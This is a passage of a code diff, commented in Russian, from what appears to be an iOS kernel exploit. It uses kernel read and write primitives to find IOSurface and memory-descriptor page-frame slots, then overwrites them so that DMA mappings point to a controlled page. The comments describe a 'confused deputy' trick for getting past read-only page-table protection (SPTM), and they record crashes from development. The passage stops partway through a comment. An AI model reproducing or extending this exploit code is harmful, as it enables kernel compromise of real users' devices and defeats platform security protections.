+            } else if (kpLooksLikeKernelPointer(fobj)) {
+                // НЕ SendRight (или strip-промах на addrDiv) — глубокий дереф
+                // ЗАПРЕЩЁН: 0x100-дамп чужого объекта = data abort (ребут #2)
+                kpNote(r, [NSString stringWithFormat:@"    fObject vtable НЕ SendRight (raw30=%#llx) — глубокий дереф пропущен (crash-guard)",
+                          (unsigned long long)early_kread64(smpKobj + 0x30)]);
+            }
+            surfVA = surfFromSendRight(smpKobj);
+            if (surfVA) kpNote(r, [NSString stringWithFormat:@"  ★ smp IOMachPort-хоп → IOSurface %#llx", (unsigned long long)surfVA]);
+        }
+        // enum всех портов задачи: перепись + оба экстрактора до первого хита
+        if (!surfVA) {
+            extern kern_return_t mach_port_names(mach_port_t, mach_port_name_t **, mach_msg_type_number_t *, mach_port_type_t **, mach_msg_type_number_t *);
+            mach_port_name_t *pnames = NULL;
+            mach_port_type_t *ptypes = NULL;
+            mach_msg_type_number_t pcnt = 0, ptcnt = 0;
+            if (mach_port_names(mach_task_self(), &pnames, &pcnt, &ptypes, &ptcnt) == KERN_SUCCESS && pnames) {
+                kpNote(r, [NSString stringWithFormat:@"  enum портов: %u имён — vtable-перепись и brute-force:", pcnt]);
+                uint64_t seen[256];
+                int nSeen = 0, nPrinted = 0;
+                for (uint32_t i = 0; i < pcnt && i < 1024; i++) {
+                    uint64_t kobj = resolveKobj(pnames[i]);
+                    if (!kobj) continue;
+                    BOOL dupK = NO;
+                    for (int j = 0; j < nSeen; j++) if (seen[j] == kobj) { dupK = YES; break; }
+                    if (dupK) continue;
+                    if (nSeen < 256) seen[nSeen++] = kobj;
+                    uint64_t vt = kp_untag_ptr(early_kread64(kobj));
+                    const char *tag = vt == vtSendRight ? "SendRight" :
+                                      vt == vtRootUC    ? "RootUC"   :
+                                      vt == vtRoot      ? "Root"     : "";
+                    if (tag[0] || nPrinted < 48) {
+                        kpNote(r, [NSString stringWithFormat:@"    name=%#x kobj=%#llx vt(file)=%#llx %s",
+                                  pnames[i], (unsigned long long)kobj,
+                                  (unsigned long long)(vt - kslide), tag]);
+                        nPrinted++;
+                    }
+                    if (surfVA) continue;
+                    uint64_t s = surfFromSendRight(kobj);
+                    const char *how = "SendRight-поле";
+                    if (!s) { s = surfFromUC(kobj); how = "UC-цепочка"; }
+                    if (s) {
+                        surfVA = s;
+                        kpNote(r, [NSString stringWithFormat:@"  ★ enum: name=%#x kobj=%#llx vt(file)=%#llx — %s → IOSurface %#llx",
+                                  pnames[i], (unsigned long long)kobj,
+                                  (unsigned long long)(vt - kslide), how, (unsigned long long)s]);
+                    }
+                }
+                mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)pnames, (mach_vm_size_t)pcnt * sizeof(mach_port_name_t));
+                if (ptypes) mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)ptypes, (mach_vm_size_t)ptcnt * sizeof(mach_port_type_t));
+            } else {
+                kpNote(r, @"  enum портов: mach_port_names не удался");
+            }
+        }
+        if (surfVA) {
+            kpNote(r, [NSString stringWithFormat:@"  ★ порт-маршрут дал surfVA=%#llx — слоты/подмена ДО submit", (unsigned long long)surfVA]);
+        } else {
+            kpNote(r, @"  порт-маршрут: IOSurface не найден ни по одному порту задачи — уходим в старые пути");
+        }
+        // 1.9.155: подмена ДО submit — прогон 1.9.154 показал, что victim успевает
+        // исполниться до подмены (churn с нулевым TSD не держит workloop). Порт-
+        // маршрут даёт surfVA задолго до scaler-коннекшенов — гонки нет вообще.
+        if (surfVA && !nSlots) {
+            uint64_t objs[6] = { surfVA, 0, 0, 0, 0, 0 };
+            uint64_t ro = kp_untag_ptr(early_kread64(surfVA + 0x178));
+            if (kpLooksLikeKernelPointer(ro)) {
+                objs[1] = ro;
+                uint64_t q18 = early_kread64(ro + 0x18);
+                uint64_t arrP = kp_untag_ptr(q18);
+                if (kpLooksLikeKernelPointer(arrP) && (uint32_t)(arrP & 0x3fff) + 8 <= 0x4000) objs[3] = arrP;
+            }
+            uint64_t plane = kp_untag_ptr(early_kread64(surfVA + 0x30));
+            if (kpLooksLikeKernelPointer(plane)) {
+                objs[4] = plane;
+                uint64_t plane2 = kp_untag_ptr(early_kread64(plane + 0x188));
+                if (kpLooksLikeKernelPointer(plane2)) objs[5] = plane2;
+            }
+            uint64_t rcnt = early_kread64(surfVA + 0x3a4);
+            uint64_t xr = early_kread64(surfVA + 0x360);
+            uint64_t xru = kp_untag_ptr(xr);
+            if (rcnt >= 1 && rcnt <= 4 && kpLooksLikeKernelPointer(xru)) objs[2] = xru;
+            kpNote(r, [NSString stringWithFormat:@"  IOSurface %#llx: rangeObj(+0x178)=%#llx plane(+0x30)=%#llx ranges(+0x360)=%#llx rangeCount(+0x3a4)=%llu",
+                      (unsigned long long)surfVA, (unsigned long long)ro,
+                      (unsigned long long)plane, (unsigned long long)xr, (unsigned long long)rcnt]);
+            const uint32_t lims[6] = { 0x400, 0x100, 0x100, 0x100, 0x200, 0x100 };
+            for (int k = 0; k < 6 && nSlots < 8; k++) {
+                uint64_t ob = objs[k];
+                if (!ob) continue;
+                uint32_t lim = lims[k];
+                uint32_t room = 0x4000 - (uint32_t)(ob & 0x3fff);
+                if (room < lim) lim = room;
+                for (uint32_t o = 0; o + 8 <= lim && nSlots < 8; o += 8) {
+                    uint64_t q = early_kread64(ob + o);
+                    int form = 0;
+                    if ((uint32_t)(q >> 32) == pfn32) form = 1;       // {pfn32, pagecount}
+                    else if (q == backingPA) form = 2;                // IOAddressRange.addr
+                    else if (q == (backingPA >> 14)) form = 3;        // pfn64
+                    else if ((uint32_t)q == pfn32) form = 4;          // pfn в low32
+                    else if ((q & 0xFFFF000000000000ULL) &&
+                             (q & 0x0000FFFFFFFFF000ULL) == backingPA) form = 5;  // PA + флаги (PTE-стиль)
+                    else if ((q & 0x000003FFFE000000ULL) == (backingPA & 0x000003FFFE000000ULL) &&
+                             (q & ~0x000003FFFE000000ULL)) form = 6;              // DART PTE (р.35: PA биты [37:13])
+                    if (!form) continue;
+                    BOOL dup = NO;
+                    for (int j = 0; j < nSlots; j++) if (slotVAs[j] == ob + o) { dup = YES; break; }
+                    if (dup) continue;
+                    slotVAs[nSlots] = ob + o;
+                    origQs[nSlots] = q;
+                    slotForm[nSlots] = form;
+                    kpNote(r, [NSString stringWithFormat:@"  pfn-слот#%d форма%d @ obj%d+%#x (%#llx): %#018llx",
+                              nSlots, form, k, o, (unsigned long long)(ob + o), (unsigned long long)q]);
+                    nSlots++;
+                }
+            }
+            // 1.9.157 (раунд 33): настоящий источник PA для DMA = ranges ВНУТРИ
+            // plane-desc (IOMemoryDescriptor-копия, снапшот при IOSurfaceCreate) —
+            // слот +0x98 на DART-пути не читается (поэтому 1.9.154/155 мимо).
+            // Ищем указатель на ranges в plane-desc: [P]==backingPA / pfn-формы.
+            if (objs[4]) {
+                uint64_t pd = objs[4];
+                uint64_t pvt = kp_untag_ptr(early_kread64(pd));
+                uint64_t pvtFile = pvt ? pvt - kslide : 0;
+                kpNote(r, [NSString stringWithFormat:@"  planeDesc vtable: %#llx (file %#llx)%@",
+                          (unsigned long long)pvt, (unsigned long long)pvtFile,
+                          pvtFile == 0x7afc5b0 ? @" = IOGeneralMemoryDescriptor" :
+                          pvtFile == 0x7afc0b0 ? @" = IOSubMemoryDescriptor" : @" — класс IOMD"]);
+                // 1.9.158 (раунд 34): IOGMD +0x60=_ranges* ({addr,len} stride 0x10),
+                // +0x68=count; IOSubMD +0x60=_parent → рекурсия в parent. Явный
+                // патч-поинт: [ranges*]==backingPA → пишем ctlPA туда.
+                uint64_t md = pd;
+                for (int lvl = 0; lvl < 2 && nSlots < 8; lvl++) {
+                    uint64_t rP = kp_untag_ptr(early_kread64(md + 0x60));
+                    uint32_t rc32 = (uint32_t)early_kread64(md + 0x68);
+                    if (!kpLooksLikeKernelPointer(rP) || (uint32_t)(rP & 0x3fff) + 0x10 > 0x4000) break;
+                    uint64_t a0 = early_kread64(rP);
+                    uint64_t a1 = early_kread64(rP + 8);
+                    kpNote(r, [NSString stringWithFormat:@"    IOMD lvl%d: md=%#llx [+0x60]=%#llx count=%u [0]=%#018llx [8]=%#018llx",
+                              lvl, (unsigned long long)md, (unsigned long long)rP, rc32,
+                              (unsigned long long)a0, (unsigned long long)a1]);
+                    if (a0 == backingPA) {
+                        kpNote(r, @"    ★ IOMD ranges[0].addr == backingPA — ПАТЧ-ПОИНТ");
+                        BOOL dup = NO;
+                        for (int j = 0; j < nSlots; j++) if (slotVAs[j] == rP) { dup = YES; break; }
+                        if (!dup) {
+                            slotVAs[nSlots] = rP;
+                            origQs[nSlots] = a0;
+                            slotForm[nSlots] = 2;
+                            nSlots++;
+                        }
+                        break;
+                    }
+                    md = rP;   // не совпало: возможно IOSubMD — идём в parent
+                    if (!kpLooksLikeKernelPointer(md)) break;
+                }
+                // 1.9.160: сырцовый дамп plane-desc (0x100) — читаем формат
+                // глазами, плюс pointee-скан: каждый ptr P → [P..P+0x80] на
+                // backingPA/pfn (буфер page-list может быть отдельной аллокацией).
+                if ((uint32_t)(pd & 0x3fff) + 0x100 <= 0x4000) {
+                    for (uint32_t o = 0; o + 8 <= 0x100; o += 8)
+                        kpNote(r, [NSString stringWithFormat:@"    pd+%#04x: %#018llx", o,
+                                  (unsigned long long)early_kread64(pd + o)]);
+                }
+                for (uint32_t o = 0; o + 8 <= 0x200 && nSlots < 8; o += 8) {
+                    uint64_t P = kp_untag_ptr(early_kread64(pd + o));
+                    if (!kpLooksLikeKernelPointer(P) || (uint32_t)(P & 0x3fff) + 0x88 > 0x4000) continue;
+                    for (uint32_t o2 = 0; o2 + 8 <= 0x80; o2 += 8) {
+                        uint64_t q = early_kread64(P + o2);
+                        int form = 0;
+                        if ((uint32_t)(q >> 32) == pfn32) form = 1;
+                        else if (q == backingPA) form = 2;
+                        else if (q == (backingPA >> 14)) form = 3;
+                        else if ((uint32_t)q == pfn32) form = 4;
+                        if (!form) continue;
+                        BOOL dup = NO;
+                        for (int j = 0; j < nSlots; j++) if (slotVAs[j] == P + o2) { dup = YES; break; }
+                        if (dup) continue;
+                        kpNote(r, [NSString stringWithFormat:@"  pointee-hit @ pd+%#x→%#llx+%#x: %#018llx форма%d",
+                                  o, (unsigned long long)P, o2, (unsigned long long)q, form]);
+                        slotVAs[nSlots] = P + o2;
+                        origQs[nSlots] = q;
+                        slotForm[nSlots] = form;
+                        nSlots++;
+                    }
+                }
+            }
+            if (nSlots) {
+                rangesVA = slotVAs[0];   // совместимость со старым кодом ниже
+                int stuck = 0;
+                for (int j = 0; j < nSlots; j++) {
+                    uint64_t newQ = (slotForm[j] == 1)
+                                  ? (((uint64_t)ctlPFN << 32) | (origQs[j] & 0xFFFFFFFFULL))
+                                  : (slotForm[j] == 2) ? ctlPA
+                                  : (slotForm[j] == 3) ? (ctlPA >> 14)
+                                  : (slotForm[j] == 5) ? ((origQs[j] & 0xFFFF000000000000ULL) | ctlPA)
+                                  : (slotForm[j] == 6) ? ((origQs[j] & ~0x000003FFFE000000ULL) | (ctlPA & 0x000003FFFE000000ULL))
+                                  : ((origQs[j] & 0xFFFFFFFF00000000ULL) | (uint64_t)ctlPFN);
+                    newQs[j] = newQ;
+                    early_kwrite64(slotVAs[j], newQ);
+                    uint64_t rb = early_kread64(slotVAs[j]);
+                    if (rb == newQ) stuck++;
+                    kpNote(r, [NSString stringWithFormat:@"  ПОДМЕНА слот#%d %#018llx → %#018llx — %@",
+                              j, (unsigned long long)origQs[j], (unsigned long long)newQ,
+                              rb == newQ ? @"ПРИЛИПЛО" : @"НЕ прилипло"]);
+                }
+                kpNote(r, [NSString stringWithFormat:@"  ★ surfVA=%#llx, пропатчено %d/%d слотов ДО submit",
+                          (unsigned long long)surfVA, stuck, nSlots]);
+                if (!stuck) nSlots = 0;   // запись не липнет — откат к старым путям
+            } else {
+                kpNote(r, @"  IOSurface найден, но pfn-слотов нет — уходим в старые пути");
+            }
+        }
+        // 1.9.252: src-поверхность для physread через DART — НЕ swap (swap-оп
+        // дропается молча, 2/2 sig=0x41 в 252). Тот же порт-маршрут:
+        // IOSurfaceCreateMachPort(srcS) → kobj → SendRight-хоп → [cand+0x10]==srcID.
+        // Потом CHAIN-цепь pd→hdr→buf — physread идёт НОРМАЛЬНЫМ направлением
+        // (src отравлен = его контент = таблица).
+        {
+            uint8_t *spix = NULL;
+            IOSurfaceLock(srcS, 0, NULL);
+            spix = (uint8_t *)IOSurfaceGetBaseAddress(srcS);
+            IOSurfaceUnlock(srcS, 0, NULL);
+            uint64_t srcPA = (spix && ttM) ? vtophys(ttM, (uint64_t)spix) : 0;
+            uint32_t srcPfn32 = (uint32_t)(srcPA >> 14);
+            mach_port_t smpS = pCreateMachPort ? pCreateMachPort(srcS) : 0;
+            uint64_t smpSKobj = resolveKobj(smpS);
+            if (smpSKobj) {
+                uint64_t fobj = kp_untag_ptr(early_kread64(smpSKobj + 0x30));
+                if (kpLooksLikeKernelPointer(fobj) && kp_untag_ptr(early_kread64(fobj)) == vtSendRight) {
+                    uint64_t cand = kp_untag_ptr(early_kread64(fobj + 0x18));
+                    if (kpLooksLikeKernelPointer(cand) && (uint32_t)early_kread64(cand + 0x10) == srcID) srcVA = cand;
+                }
+            }
+            if (srcVA) {
+                uint64_t pdS = kp_untag_ptr(early_kread64(srcVA + 0x30));
+                uint64_t typS = pdS ? (early_kread64(pdS + 0x20) & 0xf0) : 0;
+                uint64_t hdrS = (typS == 0x10) ? kp_untag_ptr(early_kread64(pdS + 0x90)) : 0;
+                uint64_t bufS = hdrS ? kp_untag_ptr(early_kread64(hdrS + 0x10)) : 0;
+                uint32_t cntS = bufS ? (uint32_t)early_kread64(bufS + 0x28) : 0;
+                uint64_t e0S = bufS ? early_kread64(bufS + 0x30) : 0;
+                BOOL okS = bufS && cntS && cntS < 0x1000 && (uint32_t)e0S == srcPfn32 &&
+                           ((uint32_t)(e0S >> 32) == 0 || (uint32_t)(e0S >> 32) == 4);
+                kpNote(r, [NSString stringWithFormat:@"  [CHAIN-S] srcVA=%#llx pd=%#llx type=%#llx buf=%#llx count=%#x entry0=%#018llx — %@",
+                          (unsigned long long)srcVA, (unsigned long long)pdS, (unsigned long long)typS,
+                          (unsigned long long)bufS, cntS, (unsigned long long)e0S,
+                          okS ? @"маркеры сошлись (physread вооружён)" : @"маркеры МИМО — physread ограничен"]);
+                if (okS) srcBuf = bufS;
+            } else if (smpSKobj) {
+                kpNote(r, @"  [CHAIN-S] srcVA не разрешён по SendRight — physread ограничен");
+            }
+        }
+    }
+    // 1.9.197: CONFUSED DEPUTY — pfn-слот откатывается при prepare (пересчёт из
+    // авторитетного источника). SCAN A каждый бут находит тот же pfn в ДРУГИХ
+    // 0x21-страницах (зона, RW). Патчим ВСЕ хранилища pfn: prepare пересчитает
+    // PTE уже с ctlPFN и драйвер САМ запишет его с привилегиями — SPTM-RO
+    // таблиц обходится без единой записи в таблицу с нашей стороны. Первая
+    // запись пробная (пауза+лог): если physmap-запись в 0x21 тоже охраняется,
+    // паника назовёт адрес (x1), остальное не тронуто.
+    uint64_t hitAddr[24], hitOld[24]; int hitForm[24];   // DEP-хиты уровня функции — форж перепатчит на ucredPFN (1.9.208)
+    int nDep = 0;
+    uint64_t buf247 = 0, flOld247 = 0;   // 1.9.248: record buffer CHAIN + flags-оригинал — пост-submit дампы (H1 rebuild vs H2 mapper-игнор)
+    // 1.9.247: CHAIN (р.61) — АВТОРИТЕТНЫЙ record buffer дескриптора, ноль сканов.
+    // Цепочка: [surf+0x30]=pd → [pd+0x90]=hdr → [hdr+0x10]=buffer;
+    // buffer+0x28=count (0x20=32 стр. для 512KB), +0x2d=flags(bit1=built),
+    // +0x30=entries {pfn32,flags32} stride 8. Cached map-путь ЧИТАЕТ эти записи
+    // (сериализатор 0x86eab60 → mapper → DART leaf PTE): патч entry[0].lo32=ctlPFN
+    // (hi32=4 сохраняем — флаг mapped), submit с bit43=0 (уже в tsdV) перестраивает
+    // PTE из отравленного буфера. Маркеры на каждом шаге = самопроверка.
+    if (pfn32 && ctlPFN) {
+        uint64_t pd247 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+        uint64_t vt247 = pd247 ? kp_untag_ptr(early_kread64(pd247)) : 0;
+        uint64_t typ247 = pd247 ? (early_kread64(pd247 + 0x20) & 0xf0) : 0;
+        uint64_t hdr247 = (typ247 == 0x10) ? kp_untag_ptr(early_kread64(pd247 + 0x90)) : 0;
+        buf247 = hdr247 ? kp_untag_ptr(early_kread64(hdr247 + 0x10)) : 0;
+        uint32_t cnt247 = buf247 ? (uint32_t)early_kread64(buf247 + 0x28) : 0;
+        uint8_t bfl247 = 0; if (buf247) kreadbuf(buf247 + 0x2d, &bfl247, 1);
+        kpNote(r, [NSString stringWithFormat:@"  [CHAIN] pd=%#llx vt=%#llx type=%#llx hdr=%#llx buf=%#llx count=%#x flags=%#x — %@",
+                  (unsigned long long)pd247, (unsigned long long)vt247, (unsigned long long)typ247,
+                  (unsigned long long)hdr247, (unsigned long long)buf247, cnt247, bfl247,
+                  (buf247 && cnt247 && cnt247 < 0x1000) ? @"маркеры сошлись, патчим entries" : @"маркеры МИМО — fallback на EARLY-скан"]);
+        if (buf247 && cnt247 && cnt247 < 0x1000) {
+            for (uint32_t i = 0; i < cnt247 && nDep < 24; i++) {
+                uint64_t e = early_kread64(buf247 + 0x30 + (uint64_t)i * 8);
+                if ((uint32_t)e != pfn32) continue;
+                if (!((uint32_t)(e >> 32) == 0 || (uint32_t)(e >> 32) == 4)) continue;
+                int zc = kpZoneClass(buf247 + 0x30 + (uint64_t)i * 8);
+                kpNote(r, [NSString stringWithFormat:@"  [CHAIN] ★ entry[%u] @ %#llx: %#018llx → ctlPFN %#x (зона: %@)",
+                          i, (unsigned long long)(buf247 + 0x30 + (uint64_t)i * 8), (unsigned long long)e, ctlPFN,
+                          zc == 1 ? @"PER-CPU (restore обязателен)" : zc == 0 ? @"обычная" : @"не зона/VM"]);
+                usleep(1500);
+                early_kwrite64(buf247 + 0x30 + (uint64_t)i * 8, (e & 0xffffffff00000000ULL) | ctlPFN);
+                uint64_t rb = early_kread64(buf247 + 0x30 + (uint64_t)i * 8);
+                kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, (uint32_t)rb == ctlPFN ? @"ПРИЛИПЛО" : @"МИМО"]);
+                hitAddr[nDep] = buf247 + 0x30 + (uint64_t)i * 8; hitOld[nDep] = e; hitForm[nDep] = 5; nDep++;
+            }
+            // 1.9.250 (р.62): bit1 SET = STALE-ветка — op-4 отдаёт старые сегменты
+            // buffer+0x10, entries НЕ читаются (ошибка 248-й: яд нетронут, PTE мимо).
+            // Нужен bit1 CLEAR: сериализатор читает entries напрямую (0x86eae2c:
+            // ldr w14 = pfn32 → PA = pfn<<14|pageOff → mapper → DART PTE).
+            // Снимаем бит если стоит; оригинал кворда — в финальный restore.
+            if (nDep && (bfl247 & 0x02)) {
+                uint8_t fnew = bfl247 & ~0x02;
+                usleep(1500);
+                flOld247 = early_kread64(buf247 + 0x28);
+                early_kwrite64(buf247 + 0x28, (flOld247 & ~(0xffULL << 40)) | ((uint64_t)fnew << 40));   // байт +0x2d = биты 40-47
+                uint8_t fck = 0; kreadbuf(buf247 + 0x2d, &fck, 1);
+                kpNote(r, [NSString stringWithFormat:@"  [CHAIN] гарант serialize (bit1 clear): flags %#x → %#x — %@", bfl247, fck, !(fck & 0x02) ? @"ВСТАЛО" : @"МИМО"]);
+            }
+        }
+    }
+    // 1.9.244: РАННИЙ ПАТЧ — page-0 записи page-list из SCAN A (найдены до любого
+    // submit, до 9+ секунд DEP-скана = вне окна мины). zone-VA по значению хита
+    // (physmap-записей ноль — урок 220/242), классификатор зоны р.59 в лог,
+    // запись с сохранением hi32 (форма5). Retry-цикл ниже подхватывает их как
+    // обычные DEP-хиты; restore — сразу после вердикта, до любого teardown'а.
+    // 1.9.247: fallback — только если CHAIN ничего не зарегистрировал.
+    if (pfn32 && ctlPFN && nSA && !nDep) {
+        for (int i = 0; i < nSA && nDep < 24; i++) {
+            uint64_t q = saQ[i];
+            if (!((uint32_t)q == pfn32 && ((uint32_t)(q >> 32) == 0 || (uint32_t)(q >> 32) == 4))) continue;
+            uint64_t pd244 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+            uint64_t ro244 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x178)) : 0;
+            // 1.9.245: per-anchor окна ±32MB, НЕ min..max спан — rangeObj-якорь живёт
+            // в VM-полосе 0xffffffdc… и раздувал спан до ~3TB (26 минут скана =
+            // окно мины, паника 063308). planeDesc первым: page-list рядом с MD в GEN3.
+            // 1.9.246: ro244 возвращён третьим якорем — page-list массив это
+            // kalloc_large → VM-субдиапазон зоны, сосед rangeObj (в 635-м ±32MB
+            // вокруг pd244/surfVA промахнулись, VM-полоса не сканировалась).
+            uint64_t anch[3] = { pd244, ro244, surfVA };
+            uint64_t zva = 0;
+            uint32_t pgBudget = 15360;
+            for (int a = 0; a < 3 && !zva && pgBudget; a++) {
+                if (!kpLooksLikeKernelPointer(anch[a])) continue;
+                uint64_t abase = anch[a] & ~0x3fffULL;
+                uint64_t lo = abase - 0x2000000ULL, hi = abase + 0x2000000ULL;
+                uint32_t seen = 0;
+                for (uint64_t pg = lo; pg < hi && !zva && pgBudget; pg += 0x4000) {
+                    if (!kpSafeToRead(pg)) continue;
+                    uint64_t ppa = kvtophys(pg);
+                    int pft = ppa ? kpFrameTypeOf(ppa) : -1;
+                    if (!(pft == 0x21 || pft == 0x6 || pft == 0xc)) continue;
+                    pgBudget--;
+                    if (++seen % 1024 == 0)
+                        kpNote(r, [NSString stringWithFormat:@"  [EARLY] zone-скан anchor#%d: %u кандидатов…", a, seen]);
+                    uint8_t zbuf[0x4000];
+                    kreadbuf(pg, zbuf, sizeof(zbuf));
+                    for (uint32_t zo = 0; zo + 8 <= sizeof(zbuf) && !zva; zo += 8) {
+                        uint64_t zq = 0; memcpy(&zq, zbuf + zo, 8);
+                        if (zq != q) continue;
+                        if (pg + zo == saAddr[i]) continue;   // physmap-алиас сам себя
+                        zva = pg + zo;
+                    }
+                }
+            }
+            if (!zva) {
+                kpNote(r, [NSString stringWithFormat:@"  [EARLY] page-0 pfn32(hi=%u) @ physmap %#llx — zone-VA НЕ найден, хит пропущен (устройство живо, яд не вписан)", (uint32_t)(q >> 32), (unsigned long long)saAddr[i]]);
+                continue;
+            }
+            int zc = kpZoneClass(zva);
+            kpNote(r, [NSString stringWithFormat:@"  [EARLY] ★ page-0 запись pfn32(hi=%u) zone-VA %#llx → ctlPFN %#x (зона: %@)",
+                      (uint32_t)(q >> 32), (unsigned long long)zva, ctlPFN,
+                      zc == 1 ? @"PER-CPU (free по ней = паника, restore обязателен)" : zc == 0 ? @"обычная" : @"не зона/VM"]);
+            usleep(1500);
+            early_kwrite64(zva, (q & 0xffffffff00000000ULL) | ctlPFN);
+            uint64_t rb = early_kread64(zva);
+            kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, (uint32_t)rb == ctlPFN ? @"ПРИЛИПЛО" : @"МИМО"]);
+            hitAddr[nDep] = zva; hitOld[nDep] = q; hitForm[nDep] = 5; nDep++;
+        }
+    }
+    if (pfn32 && ctlPFN && !nDep) {   // 1.9.248: CHAIN жив → DEP-диагностика не нужна (12с окна мины)
+        uint64_t ftVA2 = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
+        uint64_t totalPages2 = kconstant(physSize) >> 14;
+        static uint8_t ftCh2[0x10000];
+        int frBudget = 100;   // 1.9.248: SIGNED + проверка в ОБОИХ циклах — 1.9.244 uint32 wrap (0-1=UINT_MAX) дал 20558 фреймов = 2 мин окна мины
+        for (uint64_t fb = 0; fb < totalPages2 && nDep < 24 && ftVA2 && frBudget > 0; fb += 4096) {
+            uint64_t nent = totalPages2 - fb; if (nent > 4096) nent = 4096;
+            kreadbuf(ftVA2 + fb * 16, ftCh2, (size_t)(nent * 16));
+            for (uint64_t e = 0; e < nent && nDep < 24 && frBudget > 0; e++) {
+                uint8_t t2 = ftCh2[e * 16 + 2];
+                // 1.9.220: скан ТОЛЬКО по {0x21,0x6,0xc} — выигрышный форма2-хит
+                // (1.9.207) был найден именно в этих типах; табличные {8,9,13,11}
+                // дают ТОЛЬКО риск (убийца PPL-страницы, ребуты 1.9.218 ×2 в
+                // середине скана) и ноль новых хранилищ. Лотерея типов закрыта.
+                if (!(t2 == 0x21 || t2 == 0x6 || t2 == 0xc)) continue;
+                uint64_t pa = kconstant(physBase) + (fb + e) * 0x4000;
+                uint64_t kva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
+                if (!kva || kpVAIsEL2Domain(kva)) continue;
+                kpNote(r, [NSString stringWithFormat:@"  [DEP] читаю фрейм %#llx t=%#x", (unsigned long long)pa, t2]);
+                uint8_t pbuf2[0x4000];
+                kreadbuf(kva, pbuf2, sizeof(pbuf2));
+                if (frBudget > 0) frBudget--;
+                for (uint32_t o = 0; o + 8 <= sizeof(pbuf2) && nDep < 24; o += 8) {
+                    uint64_t q = 0; memcpy(&q, pbuf2 + o, 8);
+                    // 1.9.242: детектор по СИГНАТУРЕ, без серии — page-list в этом
+                    // буте фрагментирован (по 2 записи на страницу), run≥4 мимо.
+                    // Подпись: lo32==pfn32 (наша page-0 запись гарантированно) И
+                    // hi32 ∈ {0,4} (обе упаковки из SCAN B). Совпадение почти
+                    // невозможно случайно (huge count + non-pointer hi). +vtNear.
+                    if ((uint32_t)q == pfn32 && ((uint32_t)(q >> 32) == 0 || (uint32_t)(q >> 32) == 4)) {
+                        BOOL vtNear = NO;
+                        for (int d = -2; d <= 2 && !vtNear; d++) {
+                            if (!d) continue;
+                            long oo = (long)o + d * 8;
+                            if (oo < 0 || oo + 8 > (long)sizeof(pbuf2)) continue;
+                            uint64_t nv = kp_untag_ptr(*(uint64_t *)(pbuf2 + oo));
+                            if (nv >= kconstant(base) && nv < kconstant(base) + 0x6000000ULL) vtNear = YES;
+                        }
+                        if (!vtNear) {
+                            // 1.9.246: zone-поиск в DEP-цикле УБРАН насовсем — walker
+                            // уходил в deadly-регионы (census 0xb = последний тип перед
+                            // тихим ресетом 635-го, паник-лога нет) и имел 3TB-спан.
+                            // Сигнатурный хит = только диагностика. Патч-пути: EARLY
+                            // (bounded per-anchor) и spec+0x58 (объектные цепочки).
+                            kpNote(r, [NSString stringWithFormat:@"  [DEP] сигнатура pfn32(hi=%u) @ %#llx — диагностика, яд не вписан (1.9.246)", (uint32_t)(q >> 32), (unsigned long long)(kva + o)]);
+                            continue;
+                        }
+                    }
+                    // 1.9.239: PAGE-LIST серия (если целая) — детектор ±-направление,
+                    // обе упаковки (hi∈{0,4}); патч только page-0 записи серии.
+                    {
+                        int dir = 0;
+                        uint32_t run = 0;
+                        for (int tryDir = 1; tryDir >= -1 && !run; tryDir -= 2) {
+                            uint32_t rr = 0;
+                            for (uint32_t r = 0; r < 32 && o + (uint64_t)(r + 1) * 8 <= sizeof(pbuf2); r++) {
+                                uint64_t qn = 0; memcpy(&qn, pbuf2 + o + (uint64_t)r * 8, 8);
+                                uint32_t lo = (uint32_t)qn, hi = (uint32_t)(qn >> 32);
+                                if (lo == (uint32_t)((int64_t)pfn32 + tryDir * (int)r) && (hi == 0 || hi == 4)) rr++;
+                                else break;
+                            }
+                            if (rr >= 4) { run = rr; dir = tryDir; }
+                        }
+                        if (run >= 4) {
+                            // 1.9.246: серия = только диагностика (zone-поиск убран —
+                            // см. выше, тихий ресет 635-го).
+                            kpNote(r, [NSString stringWithFormat:@"  [DEP] ★★ PAGE-LIST: серия %u pfn (%s) @ %#llx+%#x — диагностика, яд не вписан (1.9.246)",
+                                      run, dir > 0 ? "asc" : "desc", (unsigned long long)kva, o]);
+                            continue;
+                        }
+                    }
+                    int form = 0;
+                    if (q == backingPA) form = 1;
+                    else if ((uint32_t)(q >> 32) == pfn32 && (q & 0xffffffffULL) == 1) form = 3;   // слот-форма pfn<<32|1 — отличительная
+                    else if ((uint32_t)q == pfn32 && (q >> 32) && (q >> 32) <= 0x10) form = 4;      // pfn low32 + малый hi32
+                    else if (q == (uint64_t)pfn32) form = 2;                                      // 1.9.203: голый pfn, hi=0
+                    if (!form) continue;
+                    // 1.9.219: безопасность яда — (1) форма4 ({4<<32,pfn}): НЕ источник
+                    // rewriter'а (никогда его не читал), но ЧЬЯ-ТО живая page-запись —
+                    // удержание яда ~секунды = коррупция чужой подсистемы (тихий ресет
+                    // в retry#2, prev-12). Пропускаем. (2) сосед-vtable (kernel-text
+                    // указатель рядом) = страница объекта — не трогаем ничего.
+                    if (form == 4) continue;
+                    BOOL vtNear = NO;
+                    for (int d = -2; d <= 2 && !vtNear; d++) {
+                        if (d == 0) continue;
+                        long oo = (long)o + d * 8;
+                        if (oo < 0 || oo + 8 > (long)sizeof(pbuf2)) continue;
+                        uint64_t nv = kp_untag_ptr(*(uint64_t *)(pbuf2 + oo));
+                        if (nv >= kconstant(base) && nv < kconstant(base) + 0x6000000ULL) vtNear = YES;
+                    }
+                    if (vtNear) continue;
+                    hitAddr[nDep] = kva + o; hitOld[nDep] = q; hitForm[nDep] = form; nDep++;
+                }
+            }
+        }
+        kpNote(r, [NSString stringWithFormat:@"  [DEP] хранилищ pfn: %d (форма4 исключена) — DEP-яд УБРАН (1.9.230)", nDep, ctlPFN, (unsigned long long)ctlPA]);
+        // 1.9.230: DEP-яд с zone-сканом УБРАН ВООБЩЕ — три трупа подряд: голый pfn
